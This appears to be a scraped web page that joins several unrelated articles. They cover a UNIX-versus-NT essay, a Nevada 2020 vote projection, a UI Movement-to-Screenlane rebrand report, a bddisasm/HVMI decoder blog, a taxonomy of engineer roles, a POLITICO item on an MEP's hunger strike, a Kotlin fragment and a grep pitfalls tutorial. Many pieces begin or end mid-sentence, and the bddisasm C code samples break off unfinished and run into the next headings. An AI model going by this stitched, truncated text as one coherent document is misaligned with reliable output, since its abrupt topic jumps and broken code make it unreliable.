<p>But the most recurrent complaint was that it was too text-oriented.  People really hated the command line, with all the utilities, obscure flags, and arguments they had to memorize.  They hated all the typing.  One mislaid character and you had to start over.  Interestingly, this complaint came most often from users of the GUI-laden Macintosh or Windows platforms.  People who had slaved away on DOS batch scripts or spent their days on character-based terminals of multiuser non-UNIX machines were less likely to express the same grievance.</p>

<p>Though I understood how people might be put off by having to remember such willfully obscure utility names like cat and grep, I continued to be puzzled at why they resented typing.  Then I realized I could connect the complaint with the scores of “intellectual elite” (as my manager described them) in UNIX shops.  The common thread was wordsmithing; a suspiciously high proportion of my UNIX colleagues had already developed, in some prior career, a comfort and fluency with text and printed words.  They were adept readers and writers, and UNIX played handily to those strengths. UNIX was, in some sense, literature to them.  Suddenly the overrepresentation of polyglots, liberal-arts types, and voracious readers in the UNIX community didn't seem so mysterious, and pointed the way to a deeper issue: in a world increasingly dominated by image culture (TV, movies, <em>.jpg</em> files), UNIX remains rooted in the culture of the word.</p>

<p>UNIX programmers express themselves in a rich vocabulary of system utilities and command-line arguments, along with a flexible, varied grammar and syntax.  For UNIX enthusiasts, the language becomes second nature.  Once, I overheard a conversation in a Palo Alto restaurant: “there used to be a shrimp-and-pasta plate here under ten bucks.  Let me see... <code>cat menu | grep shrimp | test -lt $10</code>...” though not syntactically correct (and less-than-scintillating conversation), a diner from an NT shop probably couldn't have expressed himself as casually.</p>

<p>With UNIX, text — on the command line, STDIN, STDOUT, STDERR — is the primary interface mechanism: UNIX system utilities are a sort of Lego construction set for word-smiths.  Pipes and filters connect one utility to the next, text flows invisibly between.  Working with a shell, awk/lex derivatives, or the utility set is literally a word dance.</p>

<p>Working on the command line, hands poised over the keys uninterrupted by frequent reaches for the mouse, is a posture familiar to wordsmiths (especially the really old guys who once worked on teletypes or electric typewriters).  It makes some of the same demands as writing an essay.  Both require composition skills.  Both demand a thorough knowledge of grammar and syntax.  Both reward mastery with powerful, compact expression.</p>

<p>At the risk of alienating both techies and writers alike, I also suggest that UNIX offers something else prized in literature: a coherence, a consistent style, something writers call a voice.  It doesn't take much exposure to UNIX before you realize that the UNIX core was the creation of a very few well-synchronized minds.  I've never met Dennis Ritchie, Brian Kernighan, or Ken Thompson, but after a decade and a half on UNIX I imagine I might greet them as friends, knowing something of the shape of their thoughts.</p>

<p>You might argue that UNIX is as visually oriented as other OSs.  Modern UNIX offerings certainly have their fair share of GUI-based OS interfaces.  In practice though, the UNIX core subverts them; they end up serving UNIX's tradition of word culture, not replacing it.  Take a look at the console of most UNIX workstations: half the windows you see are terminal emulators with command-line prompts or vi jobs running within.</p>

<p>Nowhere is this word/image culture tension better represented than in the contrast between UNIX and NT.  When the much-vaunted UNIX-killer arrived a few years ago, backed by the full faith and credit of the Redmond juggernaut, I approached it with an open mind.  But NT left me cold.  There was something deeply unsatisfying about it.  I had that ineffable feeling (apologies to Gertrude Stein) there was no <em>there</em> there.  Granted, I already knew the major themes of system and network administration from my UNIX days, and I will admit that registry hacking did vex me for a few days, but after my short scramble up the learning curve I looked back at UNIX with the feeling I'd been demoted from a backhoe to a leaf-blower. NT just didn't offer room to move.  The one-size-fits-all, point-and-click, we've-already-anticipated-all-your-needs world of NT had me yearning for those obscure command-line flags and <code>man -k</code>.  I wanted to craft my own solutions from my own toolbox, not have my ideas slammed into the visually homogenous, prepackaged, Soviet world of Microsoft Foundation Classes.</p>

<p>NT was definitely much too close to image culture for my comfort: endless point-and-click graphical dialog boxes, hunting around the screen with the mouse, pop-up after pop-up demanding my attention.  The experience was almost exclusively reactive.  Every task demanded a GUI-based utility front-end loaded with insidious assumptions about how to visualize (and thus conceptualize) the operation.  I couldn't think “outside the box” because everything literally was a box.  There was no opportunity for ad hoc consideration of how a task might alternately be performed.</p>

<p>I will admit NT made my life easier in some respects.  I found myself doing less remembering (names of utilities, command arguments, syntax) and more recognizing (solution components associated with check boxes, radio buttons, and pull-downs).  I spent much less time typing.  Certainly my right hand spent much more time herding the mouse around the desktop.  But after a few months I started to get a tired, desolate feeling, akin to the fatigue I feel after too much channel surfing or videogaming: too much time spent reacting, not enough spent in active analysis and expression.  In short, image-culture burnout.</p>

<p>The one ray of light that illuminated my tenure in NT environments was the burgeoning popularity of …</p></div>

              <p>Nevada has 86% of its votes reported and won’t announce additional results until later today. But it’s pretty easy to crunch the numbers because it has only 22 counties.</p>
<p>Nearly all of those counties are red except for Clark and Washoe, which are by far the largest in population. All you have to do is extrapolate the remaining votes, on a per county basis, to break the same way the existing votes have gone.</p>
<p>One pitfall here is timing bias, i.e., the later counted votes within a county may be distributed differently than those counted earlier. That’s quite possible if they are comprised of a differently distributed category (e.g. mail-in vs. in-person, early vs. later received absentee ballots, etc.).</p>
<p>According to the New York Times, “Remaining votes include mail ballots received on Election Day, those that will arrive over the next week and provisional ballots.". So they’ll likely skew a bit but it’s not obvious in which direction. And 86% is a pretty good sample size.</p>
<p>The calculation below does this simple per-county extrapolation. My projected shares of the total may be off a bit due to excluding the effect of the two other party candidates, but the relative difference should be the same: Biden will win Nevada by about 1%.</p>

                <p>The story of why I had to rebuild an established site from scratch and how things are going since making the switch</p>
            
        </div>
        
    </div><div>
        <div>
            <p>Five years ago, <a href="https://www.producthunt.com/posts/ui-movement" target="_blank">I launched a little side project called UI Movement</a> which was a newsletter that featured five design animations every week. It's since grown in scope and popularity until the newsletter had close to 30,000 subscribers and the site was getting ~350,000 page views per month.</p><p>The featured designs came from various external sources, but one was by far the most popular. It made sense because that source was super well known amongst designers and it’s where they go to share their work.</p><p>The legal team from that website sent me a cease and desist for UI Movement a couple of months ago. Even though the featured designs always included attribution and links back to the original, they were clearly not happy that UI Movement was featuring content from their site. The email was a bit of a shock, but deep down I knew it could happen at any moment. Running a “curation” type site like UI Movement with most of the content coming from one source was always a risk.</p><p>I thought about making minor changes and hoping it would be enough, but decided to take a different approach.</p><p>The truth is, UI Movement is no longer a big part of my business and it was more of a passion project/hobby that I was slowly losing interest in. I was getting tired of featuring over-the-top design animations that would never make it into production or would be quite annoying for users if they did. While I still see value in finding inspiration from unrealistic designs, I wasn’t enjoying the process of curating them anymore.</p><p>Instead of shutting UI Movement down or making a few small tweaks, I decided to start from scratch and make a UI design inspiration site I could get excited about.</p><p>The end result is that UI Movement became <a href="https://screenlane.com/" target="_blank">Screenlane</a>: A site that features web &amp; mobile screenshots from live products for UI design inspiration. No more unrealistic prototypes. Admittedly, not the most innovative idea, but I believe I can get Screenlane to the point where it's providing as much or more value than UI Movement.</p><p>Screenlane has been live for ~3 weeks and I thought it would be a good time to share some numbers. This was more than a redesign or a rebrand with a domain change. It's all new content, a new domain, brand, and website. I had no idea what to expect.</p><p>Here are the numbers so far:<br></p><h2>The newsletter</h2><p>When the announcement email was sent, the newsletter had 29,662 subscribers. It now has 29,250 subscribers (a decrease of 412).</p><p>The announcement email included a big “unsubscribe” button after an explanation of the change and why it happened.<br></p><p>Since then, a couple more weekly newsletters have been sent and they both briefly mentioned the change. I'm hoping the number of unsubscribes will level off over time. 128 people have subscribed since the change, which is promising.</p><h2>Website traffic</h2><p>Traffic has dropped from ~15,000 users &amp; ~82,000 page views per week to ~8,000 users and ~38,000 page views per week.</p><p><img src="https://rocketgems.com/media/django-summernote/2020-11-04/a00341d1-3aaf-45d0-9a8e-728d22043ed9.png"><br></p><p>Traffic from <b>uimovement.com</b> is redirected to <b>screenlane.com?ref=uimovement</b>, which helps me track the trend of how much of the traffic is still attempting to go to UI Movement. I also submitted a "change of address" notice to Google through the&nbsp;Search Console.&nbsp;</p><h2><span>Reactions from subscribers</span></h2><p>I rarely heard from UI Movement subscribers until this change. At least half a dozen people have been in touch to let me know how how sad they are that UI Movement is essentially dead and how much value they got from it. A few people also shared some words of encouragement about the direction I've taken with Screenlane. It was both surprising and awesome to hear from subscribers. Honestly, I didn't expect as many people to be disappointed by the demise of UI Movement. I now feel a bit more pressure to make Screenlane great.</p><p>Overall, the decrease in newsletter subscribers is reasonably small, the drop in traffic is substantial, and the overall response to Screenlane is positive. I'm fairly happy with how things are going &amp; it will be interesting to see if I can stop the downward trend and start growing the traffic &amp; newsletter again.</p><p>It's been quite fun to make such a drastic change without worrying too much about the outcome. This whole situation would have been much worse if UI Movement was a significant part of the business or still drove a lot of traffic to <a href="https://pageflows.com/" target="_blank">Page Flows</a>.</p>

    <h2 id="introduction">Introduction</h2>

<p>Hypervisor Memory Introspection (HVMI) relies on analyzing memory accesses in order to determine whether they are legitimate or not. For example, by analyzing the old memory value and the newly stored value, HVMI can decide whether to allow the modification or not. This, however, introduces the complication of needing to do an in-depth analysis of each instruction that modifies protected memory. Unlike a RISC architecture, x86 has a large number of instructions that may access memory in a complicated, read-modify-write (RMW) manner, and using complicated addressing schemes.
In order to simplify instruction decoding and analysis, a dedicated x86 instruction decoder has been created, capable of providing full instruction information, and thus alleviating the HVMI module from needing to know x86 instructions format. This blog post will detail some bddisasm internals, how to work with it, while highlighting why it is a critical part of HVMI. In addition, we will go through some particularities of x86 instruction encoding. The main bddisasm project is located <a href="https://github.com/bitdefender/bddisasm">here</a>, and the documentation can be accessed <a href="https://bddisasm.readthedocs.io/">here</a>.</p>

<h2 id="bddisasm-overview">bddisasm Overview</h2>

<p>bddisasm is a standalone library, written in C, with some Python used for internal decoder-tables generation. The library is built to be fast, while providing as much information about the decoded instructions as possible - this is important, because other projects using bddisasm can rely on it to provide complete and accurate information about instructions. When considering other decoding libraries, there are only some which are similar in features:</p>

<ul>
  <li><a href="https://intelxed.github.io/">Intel Xed</a>, which is written and maintained by Intel, thus somehow making it the standard x86 decoder; while not the fastest, it provides rich information about the decoded instructions;</li>
  <li><a href="https://github.com/aquynh/capstone">Capstone</a>, which is basically a collection of decoders for multiple architectures;</li>
  <li><a href="https://github.com/zyantific/zydis">ZyDis</a>, which is comparable to Xed as far as features go, and lightweight (however, when bddisasm was created internally, ZyDis did not exist yet);</li>
</ul>

<p>Other decoders written in other languages, such as Rust or C#, or disassembler (which only provide a textual output of the instruction, without providing actual decoded instruction information) were not considered. Given that Xed and Capstone seemed rather difficult to work with at that time, we decided to create a lightweight decoder of our own, with the following objectives in mind:</p>

<ul>
  <li>Lightweight - written entirely in C, with no external dependencies, no memory allocated, and thread-safe by design;</li>
  <li>Fast - while we needed a decoder capable of providing as much information as possible about instructions, we still considered speed an important factor;</li>
  <li>Resilient - the decoder should be able to handle all kinds of malformed instructions, as well as valid instructions containing redundant prefixes, or encodings which are not typical;</li>
  <li>Complete - the decoder must support all existing x86 instructions, including AVX; moreover, extending the support to new instructions should be as simple as possible;</li>
  <li>Easy to work with - single-header file, single-API library, which provides all possible information in the output decoded instruction, without the need to call additional functions in order to extract information from the decoded instruction;</li>
</ul>

<p>We will not get into a comparison between bddisasm and other decoding libraries, and we will keep the focus of this blog post on how to work with bddisasm and how useful it is in HVMI.</p>

<h2 id="working-with-bddisasm">Working With bddisasm</h2>

<p>Working with the decoding library is easy: include the <code>bddisasm.h</code> header file, link with the <code>bddisasm.lib</code> (Windows) or <code>libbddisasm.a</code> (Linux), and call the decoding API! bddisasm uses a single-API decoding scheme, where the <code>NdDecode</code> APIs provide an output <code>INSTRUX</code> structure containing all the possible information about the instruction. The only thing not included in the <code>INSTRUX</code> structure is the textual disassembly of the instruction, which has to be generated separately using the <code>NdToText</code> API. A typical usage scenario might be the following:</p>

<div><div><pre><code><span>#include "bddisasm/bddisasm.h"
</span>
<span>int</span> <span>main</span><span>()</span>
<span>{</span>

<h3 id="decoded-instruction-information">Decoded Instruction Information</h3>

<p>Note that the output <code>INSTRUX ix</code> structure will contain <em>all</em> the information about the decoded instruction. A comprehensive list about what kind of information you can find:</p>

<ul>
  <li>Raw information about the instruction, such as prefixes, opcodes, modrm, SIB, displacement, immediate fields;</li>
  <li>Information about operand size, address size, vector length;</li>
  <li>Decoded prefix information, such as whether the instruction uses lock, is repeated, is xacquire/xrelease enabled or CET tracked;</li>
  <li>Length information, including about the instruction itself and different fields of the instruction, such as immediate fields or displacement;</li>
  <li>Offset information about each constituent field of the instruction (position of each field inside the instruction);</li>
  <li>Individual RFLAGS flags access mode: modified, tested, set, cleared and undefined;</li>
  <li>FPU flags access for <code>C0</code>, <code>C1</code>, <code>C2</code> and <code>C3</code> flags;</li>
  <li>AVX information, such as instruction exception class, tuple type, and rounding mode;</li>
  <li>Instruction category (example: CALL, RET, ARITH, LOGIC, etc.);</li>
  <li>Instruction set (example: I86, I64, MMX, SSE4, etc.);</li>
  <li>CPUID feature flag, which indicates the leaf and subleaf that must be queried, together with the register and bit which indicates support for that particular instruction;</li>
  <li>Valid operating modes for the instruction (example: real, protected, long, VMX root, etc.);</li>
  <li>Valid prefixes for the instruction (example: REP, LOCK, etc.);</li>
  <li>Valid decorators for AVX instructions (example: masking, broadcast, rounding, etc.);</li>
  <li>Instruction Mnemonic;</li>
  <li>Operand information, including: operand type, size, access (read, conditional read, write, conditional write) and details;</li>
  <li>Full memory operand details: segment, base, index, scale, compressed displacement, stack, string, bitbase, VSIB, etc.);</li>
  <li>Implicit operands information: registers, implicit memory locations, etc.</li>
</ul>

<p>Examples on how different kind if info can be extracted from <code>INSTRUX</code> can be found on the <a href="https://bddisasm.readthedocs.io/en/latest/">official documentation page</a>.</p>

<h3 id="textual-disassembly">Textual Disassembly</h3>

<p>Using the <code>NdToText</code> function, one can convert a decoded <code>INSTRUX</code> to a textual disassembly that can be printed. The <code>NdToText</code> function only supports Intel style syntax, so the following instruction <code>33C0</code> would be decoded as <code>XOR       eax, eax</code>, and <code>4833C0</code> would be decoded as <code>XOR       rax, rax</code>. Typical usage of the <code>NdToText</code> function is:</p>
<div><div><pre><code>    <span>// Create the text disassembly for this instruction.</span>
    <span>char</span> <span>text</span><span>[</span><span>ND_MIN_BUF_SIZE</span><span>];</span>

<h2 id="bddisasm-in-hvmi">bddisasm in HVMI</h2>

<p>bddisasm is a critical part of the HVMI technology. As mentioned, decoding and analyzing instructions is important, since the vast majority of events HVMI is dealing with are EPT violations (memory-referencing instructions).</p>

<p>One of the first things HVMI does when an EPT violation takes place is to decode the offending instruction. Since accessing guest memory is usually slow (as it involves translating the guest linear address to a guest physical address, and mapping each physical page in the process - both page-tables and the actual page), once an instruction is decoded, it gets cached internally. Subsequent accesses from the same instruction pointer would yield an already decoded, cached instruction, thus speeding up this process (of course, caching instructions also implies that the pages containing them have to be monitored for modifications, in order to invalidate the cache if an instruction is modified).</p>

<p>Once the instruction has been decoded, HVMI will dissect it in order to determine each memory location accessed. This is important, because one instruction may directly, or indirectly, access multiple memory locations, and we have to analyze each access before allowing the instruction to continue. Since bddisasm provides full operand information (including implicit operands), HVMI will basically iterate through all the instruction operands, and check if they’re memory. For each memory operand, it would then make sure that it accesses a region of memory that is not monitored by HVMI. Examples of instructions that access multiple addresses might include:</p>

<ul>
  <li><code>CALL [mem]</code> - it reads the <code>[mem]</code> operand, and it writes the stack; it may also access the shadow stack, if CET Shadow Stack is enabled;</li>
  <li><code>MOVS</code> - it reads memory from <code>[rsi]</code>, and writes memory to <code>[rdi]</code>;</li>
  <li>AVX instruction using VSIB addressing - multiple addresses may be accessed by a VSIB operand such as <code>[rax+xmm0*8]</code>;</li>
  <li>MPX instructions <code>BNDLDX</code> and <code>BNDSTX</code>, which access the bounds tables;</li>
</ul>

<p>There are also some events (mostly asynchronous) which may cause EPT violations, even if the current instruction does not do any kind of memory access; such events include:</p>

<ul>
  <li>Delivery of interrupts or exceptions, which will read the Interrupt Descriptor Table (IDT), and will write the interrupt frame on the stack;</li>
  <li>Accesses inside the Global Descriptor Table (GDT), as part of a descriptor load;</li>
  <li>Access inside the Task State Segment (TSS) as part of a task switch or interrupt delivery;</li>
  <li>Accesses inside page-tables, as part of page-walks (although these are distinctively indicated using a dedicated bit inside the VMCS EPT violation exit qualification);</li>
  <li>Other memory accesses, such as Processor Trace induced accesses, Branch Trace Stores accesses, etc.</li>
</ul>

<p>These types of events are not included in the <code>INSTRUX</code> structure, as they may occur in an asynchronous manner, during normal instruction execution.</p>

<p>Once the faulting instruction has been decoded, it gets analyzed by multiple modules inside Introcore, in order to determine whether it is a legitimate modification (this is used …</p></div></article></div></div></div>

		<p>Categorization, classification, segmentation - we, human beings, love labeling things and separating them into buckets. I am not an exception, and as someone who builds &amp; develops engineering teams, I have a habit of classifying ... <strong>engineers</strong>. Of course, there are many ways of doing that: by seniority, by area of expertise, by the type of products built. But what about categorizing the engineers by <u>their (unofficial) role in getting sh... stuff done</u>?</p><p>You've probably heard about the <em>'mercenaries VS missionaries'</em> distinction, but what I mean is something far more elaborate and detailed. And what is more, my goal is not only to present the essential engineer species I distinguish but also to clarify what happens (to the organization) if any particular group is underrepresented or even missing completely.</p><p>Here we go:</p><ol><li><strong>paratroopers </strong>- geniuses who hack through, carve the path, disrupt, break the unbreakable, and act far behind the front-lines - they may be 100% anti-social, live in their own world, not able to communicate and collaborate, but they'll do work no one else is capable of</li><li><strong>lifeguards</strong> - relentless firefighters, ones who are there always to save the day, because they genuinely care - whatever happens, they won't let it go underwater (even if they lack skill, they compensate with energy, sense of duty and commitment)</li><li><strong>sages</strong> - the only ones present who are here long enough to understand how things work and why (what was the original intent, concept, vision); they preserve the knowledge about the solution (usually because they played a significant role in its creation), w/o them it's just black magic and horror</li><li><strong>evangelists</strong> - ones with the mission, who genuinely believe in what the organization is doing - that it has a real meaning worth fighting for; they are here because they think this is an unique place where they can make a real difference (for clients, society, our common future, etc.)</li><li><strong>conductors</strong> - ones who tame the chaos, effectively orchestrate others to achieve more and move further, and have enough balls to make tough, out-of-script decisions when no-one else is eager to; they have a gift of simplifying and clarifying things, usually accompanied with a skill of visualizing the work</li><li><strong>binders</strong> - individuals who make others gel together, as something greater than the sum of the individuals; thanks to them, people feel like they really belong (to something unique and special) and make real bonds with co-workers</li><li><strong>wrestlers</strong> - ones who do the heavy lifting, make the difference, are always in the first row, never afraid of challenges and obstacles (but need to be directed by someone else); they set the standards high as the objective experts in their particular field (usually technical)</li><li><strong>cannon fodder</strong> - those who do not play any major role, but probably would like to (at some point) - for now: flexible 'task pushers' &amp; gap-fillers who tend to do 80% of all work; some have true potential, some are just useful, some have stalled their promising career</li><li><strong>deadwood</strong> - people who bring less value than they consume - many of them just DGAF &amp; require constant babysitting (don't mistake it with coaching/mentoring, please), but some just lack skills or are misfits in that particular context; deadwood can be very absorbing, decrease the overall productivity &amp; deteriorate any positive traits in the company's culture</li></ol><p>To be clear, these are roles, not positions - a single individual can easily qualify as a combination of some of these (e.g. a sage who is also a conductor), but not every combination makes sense (and hence exists in the wild, of course).</p><p>What happens if your team loses all ...</p><ul><li>... <strong>paratroopers</strong> - frankly ... opinions vary; on the one hand, they can spur the innovation for the whole organization and cause real break-throughs, but betting on individuals who are brilliant but nearly impossible to cooperate with doesn't sound like a sustainable strategy for gaining a competitive edge ...</li><li>... <strong>lifeguards</strong> - you're balancing on the edge of an abyss - if things go awry, there'll be no-one to save the day - no-one will feel obliged to fix the issue; people don't CARE anymore and find it completely normal (<em>"it's just a job, after all"</em>, <em>"we work 40h/week in this country"</em>, <em>"but why me?"</em>)</li><li>... <strong>sages</strong> - there's a high chance no-one will notice: for months or even (!) years, because no-one will admit the issue openly; but people will keep going workarounds/short-cuts (because goals have to be met anyway), tangling even more dependencies, breaking boundaries, obfuscating the past design decisions - the solution drifts from complicated towards complex or even chaos (Cynefin-wise)</li><li>... <strong>evangelists</strong> - it's much harder to keep a more profound sense of purpose - intrinsic motivations are more likely to dry out, what either drives people out (of the organization) or directs them towards more shallow (and temporary) motivations (which is a short-term strategy)</li><li>... <strong>conductors</strong> - everything engulfs either on chaos or in helpless stasis (or alternately in both of them), the team is not capable of anything that requires coordination/synchronization</li><li>... <strong>binders</strong> - people work together, but in separation, instead of acting as a team, they resemble an ensemble of 1-head-only "teams", each one with its own agenda, responsibility, commitments; it doesn't mean people won't help each other if needed, but that's just accidental support, not a true synergy</li><li>... <strong>wrestlers</strong> - there's no-one to set a proper tempo/standards, the mediocrity reigns and expectation threshold deteriorates; it's perceived as OK to be 'average' while it's uncool and anti-social to step ahead and express any ambition</li></ul><p><strong>Cannon fodder</strong> and <strong>deadwood </strong>should be considered separately: the former because it's quite unlikely you'll be running out of them and the latter due to the fact that you should do your best to identify and get rid of them promptly.</p><p>Forgetting temporarily about the <strong>paratroopers</strong> (each of them is unique and it's hard to find a common denominator for them), the groups above can be conveniently aggregated into two <em>"master categories"</em>:</p><ol><li><strong>lifeguards</strong>, <strong>sages </strong>and <strong>evangelists </strong>are roles <u>specific to your organization</u> - someone who was a sage in X obviously won't start with enough org-specific knowledge to immediately become a sage in Y; it also means that growing those roles takes time, effort and mentoring - if you're caught off-guard and lose such an individual unprepared, the reasonable replacement may be a huge issue (or even - impossible (!)); the organization stripped of its lifeguards, sages and evangelists is <u>purely vegetative</u> - frequently w/o realizing that</li><li><strong>conductors</strong>, <strong>binders</strong> and <strong>wrestlers</strong> are <u>generic roles</u>, based on individual traits and/or experience - being talented/skilled in one or more of those roles massively increases your value in the job market - every sensible employer looks for such talent, so such people are always in high demand</li></ol><hr><p>It's a good moment to summarize the thought train of this blog post. IMHO the essence of conscious, long-term team building (which is a key responsibility of every Engineering Leader/Manager) is to:</p><ul><li>for <strong>lifeguards</strong>, <strong>sages</strong> and <strong>evangelists</strong> you need to <u>control the outflow</u> - the risk is losing skills/knowledge/attitude that is very hard to replace; act by shadowing, pairing, doubling positions</li><li>for <strong>conductors</strong>, <strong>binders </strong>and <strong>wrestlers</strong> you need to <u>secure the steady, healthy (&amp; regular) inflow</u> - the risk is finding out one day that all your teams consist of cannon fodder - people who expect to be led, taught, directed, but not (YET) capable to play any major role</li><li>and for <strong>paratroopers</strong> - you need to consider individually whether your organization can effectively utilize such a sophisticated "weapon" for its own advantage, w/o actually hurting itself</li></ul><hr><p>P.S. Two groups I've considered but finally excluded from the least are <em>"leaders"</em> and<em> "gardeners"</em> (ones who help other grow) - for different reasons; when it comes to leaders I think that the "leadership" aspect is covered by the 3 organization-specific groups (lifeguards, sages, evangelists), and even if I find a "gardener" a very important role long-term, its impact on short-term GSD is limited.</p><p>P.S.S. Do you agree with the choice of those roles? Can you match them to key people in your engineering organization? Or maybe you have different categories you'd like to share? Feel free to let me know in the comments below - truly appreciated.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
									<p>A senior French MEP has gone on hunger strike to demand the EU introduce a tax on financial markets and to protest against budget plans that downgraded programs on health, research and climate change. </p>
<p>“My goal is not to die but to avoid millions of deaths,” Pierre Larrouturou&nbsp;told POLITICO. “If there’s no financing, there is no agreement.”&nbsp;</p>
<p>In July, European leaders agreed on a historic&nbsp;<a href="https://www.politico.eu/article/eu-leaders-reach-deal-on-coronavirus-recovery-fund/">€1.82 trillion budget&nbsp;</a>and&nbsp;coronavirus recovery package and laid out a path to add new bloc-wide sources of revenue to finance the EU budget, including a levy based on non-recycled plastic.&nbsp;But the <a rel="noreferrer noopener" href="https://www.politico.eu/article/sidelined-on-recovery-parliament-plans-battle-over-eu-budget/" target="_blank">European Parliament is unhappy with several aspects of the deal,</a> notably the lack of a strong mechanism to punish rule of law breaches by national capitals and cuts to some programs. </p>

<p>MEPs also want a definitive timetable for the introduction of a financial transaction tax —&nbsp;something the European Commission first proposed in 2011. Larrouturou said the tax, which advocates say would ensure that the financial sector contributes more fairly to tax revenues,&nbsp;would bring in €50 billion a year.</p>
<p>The French MEP, part of the socialist group in the Parliament, said he had his sights set on a meeting of EU finance ministers&nbsp;in December where he wants agreement to establish a financial transaction tax in 2024. &nbsp;</p>
<p>“There is something obscene in saying that there is no money for health, hospitals and climate when financial markets have never been at such a high level,” said Larrouturou, who as the rapporteur for the EU's 2021 annual budget is responsible for shepherding key legislation through Parliament.</p>
<p>He&nbsp;blamed the Council — as well as his own country, France — for blocking a proposal that has been on the table for years and would help economies to repay their debt.&nbsp;EU capitals have consistently resisted the introduction of such EU-wide revenue raising mechanisms&nbsp;to keep direct control over taxation.</p>
<p>The MEP&nbsp;also warned that a financial transaction tax would help countries avoid a tough recession in 2024 because “the landing will be brutal.”&nbsp;</p>
<p>“Those countries who say 'no' to the [financial transaction tax] — it means they prefer to help traders and tax voters,” he added.&nbsp;</p>

<p>The Parliament must give its&nbsp;consent to the EU's multi-year budget running from 2021 to 2027, while the Council will also need to sign off on the final budget numbers.</p>

The range would include both the start (<code>a</code>) and end (<code>b</code>) elements, so if you want to use it to iterate through a list/array, you should either write it as <code>for (i in 0..list.size-1)</code> or use <code>until</code> instead.

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;In this article, I'll discuss 5 very confusing mistakes that have caused me to waste significant amounts of time when using the command-line tool known as 'grep' to search for things. &nbsp;I have chosen to document these mistakes in detail because they are mistakes that beginners are very likely to make at some point, but also to not be able to debug on their own. &nbsp;The root causes of these mistakes are: &nbsp;Not knowing what flavour of regular expression that grep is currently using (and/or not understanding what features that flavour supports); Not considering the escaping rules of your shell; Issues with character encodings.</p>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Here is a file containing a few lines of text that we'll place inside the file 'hello.txt':</p>

<p><code><pre>Hello World.
Hello There World.
Hello Some World.
Hello The World.
HelloWorld.
Goodbye World.
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Let's say that you wanted to use the 'grep' command to find all lines in this file that contain the word 'Hello' followed by the word 'World'. &nbsp;You could use a grep command like this:</p>

<p><code><pre><span>grep</span> <span>"</span><span>Hello.*World</span><span>"</span> hello.txt
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;and as you expect, this grep command found all of the matches that you expect:</p>

<p><code><pre>Hello World.
Hello There World.
Hello Some World.
Hello The World.
HelloWorld.
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;But now you might consider adding the additional requirement that there be at least one character between 'Hello' and 'World' so that the line with 'HelloWorld' is not included in the matches. &nbsp;Since you know that '*' is a regex pattern for 'zero or more' and '+' is a regex pattern for 'oen or more', you decide to try the following:</p>

<p><code><pre><span>grep</span> <span>"</span><span>Hello.+World</span><span>"</span> hello.txt
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;But this doesn't match anything at all! &nbsp;What's going on here? &nbsp;Isn't '+' a regular expression symbol for 'one or more'? &nbsp;The answer is related to the default regular expression mode that grep uses. &nbsp;If you don't specify any flags to grep, it will use 'BRE' or 'Basic Regular Expressions' which are very old and quite primitive. &nbsp;In fact, the official <a href="https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap09.html">standard for BRE</a> doesn't even support the '+' quantifier! &nbsp;This can lead to very confusing behaviour since you might just try escaping the '+' and find that it gives you the result you expect:</p>

<p><code><pre><span>grep</span> <span>"</span><span>Hello.</span><span>\+</span><span>World</span><span>"</span> hello.txt
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gives the following:</p>

<p><code><pre>Hello World.
Hello There World.
Hello Some World.
Hello The World.
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;But since we're still using 'BRE' regular expressions, the official standard says that this is actually undefined behaviour! &nbsp;You can learn more about this in <a href="https://blog.robertelder.org/grep-bre-ere-perl-regular-expressions/">Undefined Behaviour With Grep -E</a>.</p>




<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Let's say we have a file called 'sometext.txt' with the following text in it:</p>

<p><code><pre>Make sure you write out the `date`.

Today's date is Oct 21, 2020.
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;If you wanted to find all lines in this file that contains the word 'date', you could use this grep command:</p>

<p><code><pre><span>grep</span> date sometext.txt
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;and you'll get the following result which is what you expect:</p>

<p><code><pre>Make sure you write out the `date`.
Today's date is Oct 21, 2020.
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;But now, let's assume you wanted to use grep to only find the line that contain the backtick characters around the word 'date'. &nbsp;You might try doing the following:</p>

<p><code><pre><span>grep</span> <span>`date`</span> sometext.txt
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;But this just generates a bunch of error messages in the shell:</p>

<p><code><pre><span>grep</span>: Oct: No such file or directory
<span>grep</span>: <span>21</span>: No such file or directory
<span>grep</span>: <span>13</span>:<span>30</span>:<span>57</span>: No such file or directory
<span>grep</span>: EST: No such file or directory
<span>grep</span>: <span>2020</span>: No such file or directory
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;You might be thinking, "Oh, no problem, I'll just use double quotes" and try something like this:</p>

<p><code><pre><span>grep</span> <span>"</span><span>`date`</span><span>"</span> sometext.txt
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;But that <em>still</em> doesn't work (at least not in bash)! &nbsp;It doesn't find any matches at all! &nbsp;The problem in this case is related to the fact that the backtick character has a special meaning in our shell, even when used inside double quotes. &nbsp;To illustrate this point, we can run the following two echo commands:</p>

<p><code><pre><span>echo</span><span> </span><span>"</span><span>date</span><span>"</span>
<span>echo</span><span> </span><span>"</span><span>`date`</span><span>"</span>
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;and the output of these echo statements is:</p>

<p><code><pre>date
Mon Oct  <span>21</span> <span>13</span>:<span>30</span>:<span>57</span> EST <span>2020</span>
</pre></code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;So from reading the results above example, you can see why the grep command we last used didn't find anything:  We were literally searching for the current date instead of the word 'date' surrounded by backticks! &nbsp;The solution (in bash shell), is to use single-quotes instead:</p>

